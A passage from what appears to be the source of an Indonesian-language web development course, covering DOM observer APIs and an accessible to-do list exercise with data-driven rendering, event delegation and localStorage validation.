        { caption: 'Rekaman dikumpulkan lalu diserahkan sekaligus, bukan satu per perubahan.' },
      ),
      p(
        'Keluaran itu memperlihatkan sifat penting `MutationObserver`, yaitu ia mengumpulkan perubahan lalu memanggil fungsimu sekali dengan seluruh rekamannya. Dua penambahan menghasilkan satu pemanggilan berisi dua rekaman. Ini mencegah fungsimu terpanggil ratusan kali saat ada perubahan besar, dan sekaligus berarti kamu harus selalu menelusuri arraynya bukan mengasumsikan satu rekaman.',
      ),
      p(
        'Pemakaian `MutationObserver` yang sah cukup sempit, yaitu bereaksi terhadap perubahan yang dibuat kode di luar kendalimu, misalnya widget pihak ketiga atau editor teks kaya. Kalau kamu sendiri yang mengubah DOM-nya, kamu sudah tahu kapan perubahan itu terjadi dan tidak perlu mengamatinya. Memakainya untuk memantau perubahan yang kamu buat sendiri adalah tanda alur datanya perlu diperbaiki.',
      ),
      callout(
        'tip',
        'Tiga pengamat untuk tiga pertanyaan yang berbeda',
        '`IntersectionObserver` menjawab apakah elemen terlihat, dan itu untuk pemuatan bertahap serta gambar malas. `ResizeObserver` menjawab apakah ukuran elemen berubah, dan itu untuk komponen yang harus menyesuaikan diri terhadap lebarnya sendiri bukan lebar layar. `MutationObserver` menjawab apakah isinya berubah, dan itu hanya untuk perubahan dari luar kendalimu.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'Pengamat jarang melempar error. Yang sering terjadi adalah pengamat yang tidak pernah terpanggil, atau terpanggil terus tanpa henti.',
      ),
      code(
        'text',
        `
        const pengamat = new IntersectionObserver(tangani);
        pengamat.observe(document.querySelector('#penanda'));

        TypeError: Failed to execute 'observe' on 'IntersectionObserver':
        parameter 1 is not of type 'Element'.
        `,
        { caption: 'Elemen yang diamati tidak ditemukan, sehingga yang diberikan `null`.' },
      ),
      p(
        'Ini bentuk lain dari error elemen tidak ditemukan yang sudah dibahas di Sub-bab 4.1, dengan pesan yang berbeda karena pemeriksaannya dilakukan API pengamat. Penyebabnya sama, yaitu pemilihnya salah atau skripnya berjalan sebelum elemennya ada. Perhatikan pesannya menyebut tipe yang diharapkan, dan itu petunjuk yang lebih jelas daripada `Cannot read properties of null`.',
      ),
      code(
        'text',
        `
        // Pengamat dipasang, dan callback-nya tidak pernah terpanggil.
        pengamat.observe(penanda);

        // Penanda ada di dalam elemen bergaya display: none.
        `,
        { caption: 'Tidak ada error, dan tidak ada pemanggilan sama sekali.' },
      ),
      p(
        'Elemen yang disembunyikan dengan `display: none` tidak punya kotak tata letak, sehingga ia tidak pernah dianggap berpotongan dengan apa pun. Penyebab lain yang sama seringnya adalah elemen yang tingginya nol karena tidak berisi apa-apa, misalnya `div` penanda kosong tanpa tinggi. Beri penanda itu tinggi minimal satu piksel, atau isi dengan sesuatu.',
      ),
      code(
        'text',
        `
        const pengamat = new MutationObserver(() => {
          wadah.appendChild(document.createElement('div'));
        });
        pengamat.observe(wadah, { childList: true });

        (Tab membeku. Pengamat memicu dirinya sendiri tanpa henti.)
        `,
        { caption: 'Perubahan yang dibuat di dalam callback memicu callback itu lagi.' },
      ),
      p(
        'Ini kesalahan khas `MutationObserver` dan ia membekukan tab tanpa pesan apa pun. Kalau callback-mu memang perlu mengubah DOM yang sedang diamati, ada dua jalan keluar. Hentikan pengamatan dengan `disconnect` sebelum mengubah lalu pasang lagi sesudahnya, atau tandai perubahanmu sendiri dengan atribut lalu abaikan rekaman yang bertanda itu.',
      ),
      code(
        'text',
        `
        // Komponen ditutup, pengamat tidak pernah dihentikan.
        // Setelah pengguna bolak-balik sepuluh kali:

        (Sepuluh pengamat aktif, semuanya memegang elemen yang sudah dilepas.)
        `,
        { caption: 'Pengamat yang tidak dihentikan menahan elemennya di memori.' },
      ),
      p(
        'Pengamat memegang rujukan ke elemen yang diamatinya, sehingga elemen yang sudah dilepas dari halaman tetap tidak bisa dibersihkan. Ini bentuk kebocoran memori yang paling sering di aplikasi satu halaman. Selalu panggil `disconnect` saat bagian yang memasangnya ditutup, dan di React itu berarti di dalam fungsi pembersih `useEffect`.',
      ),
      table(
        ['Pesan atau gejala', 'Penyebab sebenarnya', 'Perbaikannya'],
        [
          [
            "`parameter 1 is not of type 'Element'`",
            'Elemen yang diamati tidak ditemukan',
            'Periksa pemilih dan waktu pemasangannya',
          ],
          [
            'Callback tidak pernah terpanggil',
            'Elemennya `display: none` atau tingginya nol',
            'Beri tinggi minimal, dan pastikan elemennya benar-benar dirender',
          ],
          [
            'Tab membeku setelah memasang `MutationObserver`',
            'Callback mengubah DOM yang sedang diamati',
            'Hentikan pengamatan sebelum mengubah, atau tandai perubahanmu sendiri',
          ],
          [
            'Memori terus naik setelah bolak-balik halaman',
            'Pengamat tidak pernah dihentikan',
            'Panggil `disconnect` saat komponennya ditutup',
          ],
          [
            'Callback terpanggil sekali saat pemasangan',
            'Itu perilaku bawaan, ia melaporkan keadaan awal',
            'Periksa `isIntersecting` sebelum bertindak, jangan asumsikan pemanggilan berarti perubahan',
          ],
        ],
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Pengamat adalah API yang menggantikan pola lama berbasis penangan gulir dan pemeriksaan berkala, dan sebagian besar kesalahan di bawah adalah sisa dari pola lama itu.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Memakai penangan gulir untuk mendeteksi elemen yang terlihat',
            'Itu cara yang paling sering ditemui di tutorial lama',
            'Ia memaksa pembacaan tata letak puluhan kali per detik. `IntersectionObserver` mendapat informasi yang sama dari peramban tanpa biaya itu',
          ],
          [
            'Memakai `setInterval` untuk memeriksa apakah sesuatu sudah berubah',
            'Cara paling langsung dipikirkan',
            'Ia berjalan terus walaupun tidak ada yang berubah, dan tetap berjalan setelah halamannya tidak terlihat. Pakai pengamat yang tepat',
          ],
          [
            'Lupa memanggil `disconnect` saat komponen ditutup',
            'Halamannya toh berpindah',
            'Di aplikasi satu halaman tidak ada pemuatan ulang, jadi pengamatnya tetap hidup dan menahan elemennya di memori',
          ],
          [
            'Memakai `MutationObserver` untuk memantau perubahan yang dibuat sendiri',
            'Supaya semua reaksi terkumpul di satu tempat',
            'Kamu sudah tahu kapan perubahan itu terjadi. Ini membuat alur datanya berputar dan sangat sulit ditelusuri',
          ],
          [
            'Mengasumsikan callback berisi tepat satu rekaman',
            'Satu perubahan kan satu pemanggilan',
            'Rekaman dikumpulkan lalu diserahkan sekaligus. Selalu telusuri arraynya',
          ],
          [
            'Mengabaikan `rootMargin` pada pemuatan bertahap',
            'Yang penting elemennya terdeteksi',
            'Pemuatan baru dimulai saat pengguna sudah sampai di ujung, sehingga selalu ada jeda kosong. Mulai lebih awal dengan margin',
          ],
        ],
      ),
      p(
        'Baris kedua punya alasan tambahan yang sering dilupakan. `setInterval` terus berjalan bahkan saat tab berada di latar belakang, meski peramban memperlambatnya. Untuk perangkat bertenaga baterai itu berarti daya yang terbuang tanpa hasil apa pun. Pengamat hanya bekerja saat memang ada yang berubah, dan itu perbedaan yang nyata bagi pengguna ponsel.',
      ),
      callout(
        'info',
        'Gambar malas sudah tersedia tanpa JavaScript sama sekali',
        'Atribut `loading="lazy"` pada `img` dan `iframe` sudah didukung seluruh peramban modern, dan ia menunda pengunduhan sampai elemennya mendekati pandangan. Untuk kasus itu, kamu tidak perlu `IntersectionObserver` sama sekali. Sisakan pengamat untuk hal yang memang tidak punya padanan bawaan, seperti pemuatan data bertahap.',
      ),
      divider,
      h2('Rangkuman'),
      ul(
        '`IntersectionObserver` untuk lazy load, infinite scroll, dan penanda bagian aktif.',
        '`ResizeObserver` memantau elemen, bukan jendela.',
        '`MutationObserver` hanya untuk DOM yang diubah kode di luar kendalimu.',
        'Selalu `disconnect()` saat selesai — kalau tidak, memori tertahan.',
        'Observer jauh lebih murah daripada listener `scroll` yang membaca layout.',
      ),
      references(
        {
          label: 'Intersection Observer API',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Intersection_Observer_API',
          source: 'MDN',
          note: 'Seluruh opsi `root`, `rootMargin`, dan `threshold` beserta contoh lazy loading.',
        },
        {
          label: 'ResizeObserver',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/ResizeObserver',
          source: 'MDN',
          note: 'Memantau ukuran elemen, bukan jendela — pembedaan yang menjadi inti sub-bab ini.',
        },
        {
          label: 'MutationObserver',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/MutationObserver',
          source: 'MDN',
          note: 'Untuk DOM yang diubah kode di luar kendalimu; callback-nya masuk antrean microtask.',
        },
        {
          label: 'Lazy loading images',
          href: 'https://web.dev/articles/lazy-loading-images',
          source: 'web.dev',
          note: 'Perbandingan `IntersectionObserver` dengan atribut bawaan `loading="lazy"`.',
        },
        {
          label: 'Debounce your input handlers',
          href: 'https://web.dev/articles/debounce-your-input-handlers',
          source: 'web.dev',
          note: 'Alasan pendengar `scroll` yang membaca layout jauh lebih mahal daripada observer.',
        },
      ),
    ],
  ),

  written(
    'praktik-todo-dom',
    'Praktik: To-Do List versi DOM penuh',
    27,
    'Menyambungkan modul logika Bab 1 ke tampilan nyata — tanpa menyentuh logikanya sama sekali.',
    [
      p(
        'Di Bab 1 kamu menulis `todo.js` yang tidak tahu-menahu soal layar. Sekarang kamu memberinya tampilan. Modul logikanya **tidak diubah satu baris pun** — itulah bukti bahwa pemisahannya benar.',
      ),

      terms(
        {
          term: 'render dari data',
          meaning:
            'Pola di mana tampilan **selalu dibangun ulang dari satu sumber data**, alih-alih diubah sepotong-sepotong setiap ada kejadian. Keuntungannya besar: tidak mungkin ada bagian layar yang tertinggal tidak ikut diperbarui. Ini juga persis prinsip yang dipakai React, dan mengerjakannya manual di sini membuat React jauh lebih masuk akal nanti.',
        },
        {
          term: 'single source of truth',
          meaning:
            'Terjemahannya **satu source of truth**. Aturan bahwa setiap data hanya boleh punya **satu** tempat penyimpanan resmi. Di praktik ini, variabel `daftar` adalah sumbernya; DOM hanyalah cerminan. Begitu ada dua tempat yang menyimpan hal sama, keduanya pasti berselisih cepat atau lambat.',
        },
        {
          term: 'sr-only',
          meaning:
            'Singkatan *screen reader only*, artinya **hanya untuk pembaca layar**. Class yang menyembunyikan teks dari mata tapi tetap membiarkannya dibacakan teknologi bantu. Dipakai untuk label yang secara visual sudah jelas dari konteks, tapi tetap wajib ada bagi pengguna tunanetra.',
        },
        {
          term: 'role="alert"',
          meaning:
            'Atribut ARIA yang memberi tahu pembaca layar untuk **langsung membacakan** isi elemen itu begitu berubah, memotong apa pun yang sedang dibaca. Dipakai untuk pesan error yang tidak boleh terlewat.',
        },
        {
          term: 'aria-live',
          meaning:
            'Atribut yang menandai sebuah area sebagai **berubah-ubah**, sehingga pembaca layar mengumumkan perubahannya. Nilai `polite` berarti "tunggu sampai pengguna berhenti sebentar" — pilihan yang tepat untuk ringkasan jumlah tugas yang sering berubah.',
        },
        {
          term: 'aria-pressed',
          meaning:
            'Atribut yang menyatakan sebuah tombol sedang **dalam keadaan tertekan** atau tidak. Dipakai pada tombol filter di praktik ini agar pembaca layar tahu filter mana yang sedang aktif — sesuatu yang bagi pengguna awas terlihat dari warnanya saja.',
        },
        {
          term: 'ARIA',
          meaning:
            'Singkatan *Accessible Rich Internet Applications*. Sekumpulan atribut yang menjelaskan **peran dan keadaan** sebuah elemen kepada teknologi bantu. Aturan pertamanya justru menganjurkan menahan diri: kalau ada elemen HTML bawaan yang sudah tepat, pakai itu dan jangan tambahkan ARIA.',
        },
        {
          term: 'aria-label',
          meaning:
            'Memberi **nama** pada elemen yang tidak punya teks terlihat — misalnya tombol yang hanya berisi ikon. Tanpa itu, pembaca layar hanya bisa mengumumkan "tombol" tanpa keterangan apa pun tentang fungsinya.',
        },
        {
          term: 'el (objek)',
          meaning:
            'Di praktik ini, sebuah objek yang **mengumpulkan seluruh elemen** hasil seleksi di satu tempat: `el.form`, `el.input`, `el.daftar`. Polanya berguna karena semua `querySelector` terjadi sekali di awal, bukan berulang-ulang di dalam tiap fungsi.',
        },
      ),

      h2('1. Struktur HTML'),
      code(
        'html',
        `
        <main>
          <h1>Daftar Tugas</h1>

          <form id="form-tugas">
            <label for="judul" class="sr-only">Tugas baru</label>
            <input id="judul" name="judul" required autocomplete="off"
                   placeholder="Apa yang ingin kamu kerjakan?" />
            <button type="submit">Tambah</button>
          </form>

          <p id="error" role="alert"></p>

          <div role="group" aria-label="Saring tugas">
            <button type="button" data-filter="semua" aria-pressed="true">Semua</button>
            <button type="button" data-filter="aktif" aria-pressed="false">Aktif</button>
            <button type="button" data-filter="selesai" aria-pressed="false">Selesai</button>
          </div>

          <ul id="daftar"></ul>
          <p id="ringkasan" aria-live="polite"></p>
        </main>
        `,
      ),
      p(
        'Kerangka ini sengaja ditulis lebih dulu, sebelum satu baris JavaScript pun, dan hampir seluruh keputusan aksesibilitasnya sudah selesai di sini. `<form>` dipakai sungguhan alih-alih `<div>` berisi tombol, sehingga menekan Enter di dalam input ikut mengirim, seperti dibahas di sub-bab form. `<label for="judul">` menghubungkan teks dengan inputnya, dan kelas `sr-only` menyembunyikannya secara visual tanpa menghilangkannya dari pembaca layar. `role="alert"` pada kotak error membuat pesannya **diumumkan begitu muncul**, tanpa pengguna perlu mencarinya. Tombol filter dibungkus `role="group"` dengan `aria-label`, sehingga terbaca sebagai satu kesatuan bernama. Dan `aria-live="polite"` pada ringkasan membuat perubahan jumlah tugas diumumkan pada saat yang tidak mengganggu. Perhatikan `<ul id="daftar">` dibiarkan **kosong**, sebab seluruh isinya akan dibangun dari data di langkah berikutnya.',
      ),

      h2('2. Render dari data, bukan menulis HTML manual'),
      code(
        'js',
        `
        import { buatTugas, tambah, hapus, toggleSelesai, saring, ringkasan, FILTER }
          from './todo.js';

        const el = {
          form: document.querySelector('#form-tugas'),
          input: document.querySelector('#judul'),
          error: document.querySelector('#error'),
          daftar: document.querySelector('#daftar'),
          ringkasan: document.querySelector('#ringkasan'),
        };

        let daftar = muatDariPenyimpanan();
        let filter = FILTER.SEMUA;

        function render() {
          const terlihat = saring(daftar, filter);
          el.daftar.replaceChildren();

          if (terlihat.length === 0) {
            const kosong = document.createElement('li');
            kosong.className = 'kosong';
            kosong.textContent =
              daftar.length === 0
                ? 'Belum ada tugas. Tambahkan yang pertama di atas.'
                : 'Tidak ada tugas yang cocok dengan saringan ini.';
            el.daftar.append(kosong);
          } else {
            const fragment = document.createDocumentFragment();
            for (const t of terlihat) fragment.append(buatBaris(t));
            el.daftar.append(fragment);
          }

          const r = ringkasan(daftar);
          el.ringkasan.textContent = \`\${r.selesai} dari \${r.total} selesai (\${r.persen}%)\`;
          simpanKePenyimpanan(daftar);
        }
        `,
      ),
      p(
        'Inti arsitekturnya ada pada satu kalimat. **`daftar` adalah source of truth, dan layar hanya cerminannya.** Tidak ada satu pun tempat di berkas ini yang mengubah DOM secara langsung untuk mencerminkan perubahan, karena semuanya mengubah data lalu memanggil `render()`, dan `render()` membangun ulang tampilannya dari nol. Itulah cara paling sederhana menjamin layar tidak pernah berbeda dari data. Perhatikan objek `el` di atas, yang semua `querySelector`-nya terjadi **sekali** di awal, bukan berulang di dalam tiap fungsi. Di dalam `render`, `replaceChildren()` mengosongkan daftar lebih dulu, lalu isinya dirakit di `DocumentFragment` dan disisipkan sekali, mengikuti pola batching dari sub-bab performa. Ringkasannya dihitung ulang dari `daftar` setiap kali, bukan disimpan sebagai angka tersendiri yang bisa basi. Dan `simpanKePenyimpanan` dipanggil di ujung `render`, sehingga tidak ada satu pun jalur perubahan yang bisa lupa menyimpan.',
      ),
      callout(
        'info',
        'Dua empty state yang berbeda',
        '"Belum ada tugas sama sekali" dan "ada tugas, tapi tidak ada yang cocok dengan saringan" adalah situasi berbeda dan butuh kalimat berbeda. Menyamakannya membuat pengguna mengira datanya hilang.',
      ),

      h2('3. Membuat baris — tanpa `innerHTML`'),
      code(
        'js',
        `
        function buatBaris(tugas) {
          const li = document.createElement('li');
          li.dataset.id = tugas.id;
          li.classList.toggle('selesai', tugas.selesai);

          const centang = document.createElement('input');
          centang.type = 'checkbox';
          centang.checked = tugas.selesai;
          centang.dataset.aksi = 'toggle';
          centang.id = \`t-\${tugas.id}\`;

          const label = document.createElement('label');
          label.htmlFor = centang.id;
          label.textContent = tugas.judul;      // AMAN untuk teks apa pun

          const hapusBtn = document.createElement('button');
          hapusBtn.type = 'button';
          hapusBtn.dataset.aksi = 'hapus';
          hapusBtn.textContent = 'Hapus';
          hapusBtn.setAttribute('aria-label', \`Hapus tugas: \${tugas.judul}\`);

          li.append(centang, label, hapusBtn);
          return li;
        }
        `,
      ),
      p(
        'Fungsi ini menyusun tiga elemen memakai **property**, alih-alih merangkai string HTML, dan judulnya menegaskan alasannya. `label.textContent = tugas.judul` aman untuk teks apa pun yang diketik pengguna, sementara jalur `innerHTML` akan membuka celah XSS di aplikasi yang isinya justru datang dari ketikan. Perhatikan beberapa detail yang mudah terlewat. `li.dataset.id` menanamkan identitas tugas ke DOM, dan itulah yang nanti dibaca listener di langkah 4 untuk tahu baris mana yang disentuh. `centang.dataset.aksi = \'toggle\'` menandai perannya, sehingga satu listener bisa membedakan kontrol tanpa perlu tahu bentuknya. Pasangan `centang.id` dan `label.htmlFor` menghubungkan keduanya, sehingga mengeklik teks ikut mencentang kotaknya, dan kemudahan itu hilang kalau penghubungnya lupa. Terakhir, `aria-label` pada tombol hapus menyebutkan **judul tugasnya**, karena pembaca layar yang menelusuri sepuluh tombol bernama "Hapus" tidak punya cara membedakan satu sama lain.',
      ),

      h2('4. Satu listener untuk seluruh daftar'),
      code(
        'js',
        `
        el.daftar.addEventListener('click', (e) => {
          const kontrol = e.target.closest('[data-aksi]');
          if (!kontrol) return;

          const id = kontrol.closest('[data-id]').dataset.id;

          if (kontrol.dataset.aksi === 'toggle') daftar = toggleSelesai(daftar, id);
          if (kontrol.dataset.aksi === 'hapus')  daftar = hapus(daftar, id);

          render();
        });
        `,
      ),
      p(
        'Satu listener ini menangani **seluruh baris, termasuk yang belum dibuat**, dan itu penerapan langsung event delegation dari sub-bab bubbling. Alurnya sama seperti pola yang sudah dibahas. `closest(\'[data-aksi]\')` naik dari titik klik untuk menemukan kontrolnya, lalu `closest(\'[data-id]\')` naik sekali lagi untuk menemukan baris pemiliknya. Yang layak diperhatikan adalah dua baris di tengah, karena keduanya menugaskan **ulang** `daftar` dengan hasil dari `toggleSelesai` dan `hapus`. Itu karena fungsi-fungsi di modul `todo.js` semuanya murni dan mengembalikan array baru, tidak pernah mengubah yang lama, jadi lupa menugaskan ulang berarti perubahannya benar-benar hilang. Dan `render()` di baris terakhir dipanggil **sekali** untuk kedua aksi, karena tugas render bukan "mengubah satu baris" melainkan "menyamakan layar dengan data".',
      ),

      h2('5. Form dengan penanganan error'),
      code(
        'js',
        `
        el.form.addEventListener('submit', (e) => {
          e.preventDefault();
          el.error.textContent = '';

          try {
            daftar = tambah(daftar, buatTugas(el.input.value));
            el.input.value = '';
            el.input.focus();          // siap mengetik berikutnya
            render();
          } catch (error) {
            // Error dari modul logika, bukan dari sini — itu memang tempatnya
            el.error.textContent = error.message;
            el.input.setAttribute('aria-invalid', 'true');
          }
        });
        `,
      ),
      p(
        "Perhatikan komentar di dalam `catch`, karena ia menjelaskan pembagian tugas yang menjadi inti seluruh praktik ini. **Aturan validasi tinggal di `todo.js`, bukan di sini.** `buatTugas` yang menolak judul kosong dengan `throw`, dan berkas antarmuka ini hanya menangkap lalu menampilkannya. Keuntungannya, aturan yang sama tetap berlaku dari mana pun tugas dibuat, termasuk dari console, dan menambah aturan baru cukup di satu tempat. Beberapa detail kecil ikut menentukan rasanya. `el.error.textContent = ''` di baris kedua **membersihkan error lama** sebelum mencoba lagi, karena pesan yang tertinggal dari percobaan sebelumnya lebih membingungkan daripada tidak ada pesan sama sekali. Lalu `el.input.value = ''` dan `el.input.focus()` hanya dijalankan **setelah** penambahan berhasil. Perhatikan keduanya ada di dalam `try`, sehingga pada kasus gagal apa yang diketik pengguna tidak ikut terhapus.",
      ),

      h2('6. Filter dengan status yang terbaca teknologi bantu'),
      code(
        'js',
        `
        document.querySelector('[aria-label="Saring tugas"]')
          .addEventListener('click', (e) => {
            const tombol = e.target.closest('[data-filter]');
            if (!tombol) return;

            filter = tombol.dataset.filter;

            for (const b of e.currentTarget.querySelectorAll('[data-filter]')) {
              b.setAttribute('aria-pressed', String(b === tombol));
            }

            render();
          });
        `,
      ),
      p(
        'Baris `b.setAttribute(\'aria-pressed\', String(b === tombol))` adalah bagian yang paling padat di sini, dan ia mengerjakan penyetelan **semua** tombol sekaligus dalam satu putaran. Perbandingan `b === tombol` bernilai `true` hanya untuk tombol yang barusan diklik dan `false` untuk sisanya, sehingga tidak mungkin ada dua tombol yang sama-sama tampak aktif. `String(...)` diperlukan karena nilai atribut selalu berupa teks. Menugaskan boolean memang menghasilkan `"true"` atau `"false"` juga di sebagian kasus, tapi menuliskannya eksplisit membuat maksudnya jelas. Perhatikan pemakaian `e.currentTarget` untuk mencari tombol-tombol lain, bukan `document`, karena pencariannya dibatasi ke dalam grup filter ini saja, seperti aturan seleksi di dalam elemen. Bagi pengguna awas, tombol aktif terlihat dari warnanya, sedangkan `aria-pressed` adalah cara menyampaikan informasi yang sama kepada pembaca layar.',
      ),

      h2('7. Menyimpan ke `localStorage`'),
      code(
        'js',
        `
        const KUNCI = 'todo.v1';

        function muatDariPenyimpanan() {
          try {
            const mentah = localStorage.getItem(KUNCI);
            if (!mentah) return [];

            const data = JSON.parse(mentah);
            if (!Array.isArray(data)) return [];   // data rusak — jangan dipercaya

            return data.filter(
              (t) => typeof t?.id === 'string' && typeof t?.judul === 'string',
            );
          } catch {
            return [];   // JSON rusak atau storage diblokir
          }
        }

        function simpanKePenyimpanan(data) {
          try {
            localStorage.setItem(KUNCI, JSON.stringify(data));
          } catch (error) {
            // Kuota penuh atau mode privat — beri tahu, jangan telan diam-diam
            el.error.textContent = 'Perubahan tidak bisa disimpan di browser ini.';
            console.error('[simpan]', error);
          }
        }
        `,
      ),
      p(
        'Kedua fungsi ini penuh penjagaan yang terlihat berlebihan sampai kamu tahu apa yang dijaganya. Pada `muatDariPenyimpanan` ada **tiga lapis**. `if (!mentah) return []` menangani pemakaian pertama ketika belum ada apa-apa. `if (!Array.isArray(data))` menolak data yang bentuknya sudah bukan array, mungkin sisa dari versi aplikasi lama. Lalu `filter` di bawahnya memeriksa tiap item satu per satu, membuang yang tidak punya `id` dan `judul` bertipe string. `try`/`catch` yang membungkusnya menangkap kemungkinan keempat, yaitu `JSON.parse` yang gagal karena teksnya rusak, atau `localStorage` yang diblokir sepenuhnya di mode privat. Semua unhappy path berujung `return []`, sehingga aplikasi tetap bisa dibuka meski datanya hilang. `simpanKePenyimpanan` menangani sisi lain, yaitu kuota penuh. Perhatikan ia **tidak menelan** kegagalannya. Pengguna diberi tahu bahwa perubahannya tidak tersimpan, karena diam di sini berarti membiarkan orang mengira pekerjaannya aman padahal tidak.',
      ),
      callout(
        'warning',
        'Data dari `localStorage` adalah input yang tidak tepercaya',
        'Ia bisa diedit tangan lewat DevTools, tersisa dari versi aplikasi yang lama, atau rusak sebagian. Selalu validasi bentuknya setelah `JSON.parse` — persis seperti yang kamu lakukan pada respons API.',
      ),

      checklist(
        'frontend-basic/manipulasi-dom/praktik',
        'Checklist praktik 4.13',
        'Modul `todo.js` dari Bab 1 dipakai tanpa diubah satu baris pun',
        'Tidak ada satu pun `innerHTML` di seluruh berkas',
        'Hanya ada satu listener untuk seluruh daftar (event delegation)',
        'Dua empty state dibedakan: belum ada tugas vs tidak cocok saringan',
        'Judul kosong ditolak, pesannya muncul di `role="alert"`, fokus kembali ke input',
        'Data dari `localStorage` divalidasi bentuknya setelah `JSON.parse`',
        'Kegagalan menyimpan diberitahukan, bukan ditelan diam-diam',
        'Seluruh aplikasi bisa dipakai hanya dengan keyboard',
      ),

      divider,
      h2('Studi kasus di project nyata'),
      p(
        'Aplikasi todo yang baru kamu bangun bekerja untuk sepuluh tugas. Begitu dipakai sungguhan, tiga keluhan datang. Mencentang satu tugas membuat seluruh daftar berkedip dan kotak pencarian kehilangan fokus. Judul tugas yang mengandung tanda kurung sudut merusak tata letak. Dan pengguna keyboard tidak bisa menghapus tugas sama sekali karena tombol hapusnya berupa `div`.',
      ),
      p(
        'Ketiganya berasal dari satu keputusan yang sama, yaitu menggambar ulang seluruh daftar dari teks HTML setiap kali ada perubahan. Bagian ini menunjukkan bentuk yang menutup ketiganya sekaligus, dengan menggabungkan seluruh materi bab.',
      ),
      code(
        'html',
        `
        <form id="form-tugas">
          <label for="judul-baru">Tugas baru</label>
          <input id="judul-baru" name="judul" required maxlength="200" autocomplete="off" />
          <button type="submit">Tambah</button>
        </form>

        <ul id="daftar" aria-live="polite"></ul>

        <template id="tpl-tugas">
          <li class="tugas" data-tugas-id>
            <label>
              <input type="checkbox" data-aksi="ubah-selesai" />
              <span class="judul"></span>
            </label>
            <button type="button" data-aksi="hapus">Hapus</button>
          </li>
        </template>
        `,
        { filename: 'index.html' },
      ),
      code(
        'js',
        `
        const daftarEl = document.getElementById('daftar');
        const tpl = document.getElementById('tpl-tugas');

        // Peta id ke elemen, supaya perubahan bisa diarahkan ke barisnya saja.
        const elemenTugas = new Map();

        function buatBaris(tugas) {
          const li = tpl.content.firstElementChild.cloneNode(true);
          li.dataset.tugasId = tugas.id;
          li.querySelector('.judul').textContent = tugas.judul;      // dari pengguna
          li.querySelector('[data-aksi="ubah-selesai"]').checked = tugas.selesai;
          li.classList.toggle('selesai', tugas.selesai);
          return li;
        }

        // Gambar ulang HANYA yang berubah, bukan seluruh daftar.
        function sinkronkan(daftarTugas) {
          const idSekarang = new Set(daftarTugas.map((t) => t.id));

          // 1. Hapus baris yang tugasnya sudah tidak ada.
          for (const [id, el] of elemenTugas) {
            if (!idSekarang.has(id)) {
              el.remove();
              elemenTugas.delete(id);
            }
          }

          // 2. Tambah yang baru, perbarui yang berubah.
          const frag = document.createDocumentFragment();
          for (const tugas of daftarTugas) {
            const ada = elemenTugas.get(tugas.id);
            if (!ada) {
              const li = buatBaris(tugas);
              elemenTugas.set(tugas.id, li);
              frag.append(li);
              continue;
            }
            const judulEl = ada.querySelector('.judul');
            if (judulEl.textContent !== tugas.judul) judulEl.textContent = tugas.judul;
            ada.querySelector('[data-aksi="ubah-selesai"]').checked = tugas.selesai;
            ada.classList.toggle('selesai', tugas.selesai);
          }
          if (frag.childElementCount > 0) daftarEl.append(frag);
        }
        `,
        { filename: 'src/todo/render.js' },
      ),
      p(
        'Fungsi `sinkronkan` inilah jawaban atas keluhan pertama. Ia tidak pernah menyentuh baris yang tidak berubah, sehingga fokus keyboard, posisi gulir, dan animasi yang sedang berjalan semuanya bertahan. `Map` yang memetakan id ke elemennya adalah yang memungkinkan itu, sebab tanpa peta itu kamu harus mencari elemennya di DOM setiap kali dan tidak punya cara tahu mana yang sudah ada.',
      ),
      p(
        'Pemeriksaan `if (judulEl.textContent !== tugas.judul)` sebelum menulis terlihat berlebihan dan ia punya alasan nyata. Menulis ke `textContent` selalu membatalkan pilihan teks yang sedang disorot pengguna, bahkan kalau nilainya sama persis. Memeriksa dulu membuat penulisan hanya terjadi saat memang perlu. Ini pola perbandingan sebelum menulis yang juga dipakai kerangka kerja modern di balik layar.',
      ),
      p(
        'Keluhan kedua selesai di baris `textContent = tugas.judul`. Judul yang berisi tanda kurung sudut tampil sebagai teks apa adanya, dan tidak ada satu pun yang diurai sebagai HTML. Keluhan ketiga selesai di HTML-nya, yaitu tombol hapus memakai elemen `button` sungguhan sehingga Enter dan spasi bekerja tanpa satu baris kode tambahan.',
      ),
      code(
        'js',
        `
        // Satu penangan untuk seluruh baris, termasuk yang belum ada.
        daftarEl.addEventListener('click', (peristiwa) => {
          const tombol = peristiwa.target.closest('[data-aksi]');
          if (!tombol || !daftarEl.contains(tombol)) return;

          const id = tombol.closest('[data-tugas-id]')?.dataset.tugasId;
          if (!id) return;

          if (tombol.dataset.aksi === 'hapus') {
            toko.hapus(id);
            sinkronkan(toko.isi());
          }
        });

        // Centang memakai 'change', bukan 'click'.
        daftarEl.addEventListener('change', (peristiwa) => {
          const kotak = peristiwa.target.closest('[data-aksi="ubah-selesai"]');
          if (!kotak) return;
          const id = kotak.closest('[data-tugas-id]')?.dataset.tugasId;
          if (id) toko.ubahSelesai(id, kotak.checked);
        });

        // Formulir memakai 'submit', supaya Enter ikut bekerja.
        document.getElementById('form-tugas').addEventListener('submit', (peristiwa) => {
          peristiwa.preventDefault();
          const data = new FormData(peristiwa.currentTarget);
          const judul = String(data.get('judul') ?? '').trim();
          if (judul === '') return;
          toko.tambah(judul);
          peristiwa.currentTarget.reset();
          sinkronkan(toko.isi());
        });
        `,
        { filename: 'src/todo/peristiwa.js' },
      ),
      p(
        'Tiga penangan ini dipasang sekali di elemen yang tidak pernah diganti, sehingga baris yang lahir kemudian ikut tertangani tanpa pemasangan ulang. Perhatikan centang memakai peristiwa `change` bukan `click`, dan itu bukan selera. `change` juga dipicu saat pengguna menekan spasi pada centang yang sedang mendapat fokus, sedangkan `click` pada centang punya urutan yang membingungkan terhadap nilai `checked`.',
      ),
      p(
        'Atribut `aria-live="polite"` pada daftar membuat pembaca layar mengumumkan perubahan isinya tanpa memotong apa yang sedang dibaca. Tanpa itu, pengguna pembaca layar yang menghapus tugas tidak mendapat konfirmasi apa pun bahwa tindakannya berhasil. Ini termasuk baseline aksesibilitas project ini, dan biayanya satu atribut.',
      ),
      callout(
        'tip',
        'Inilah yang dikerjakan React di balik layar',
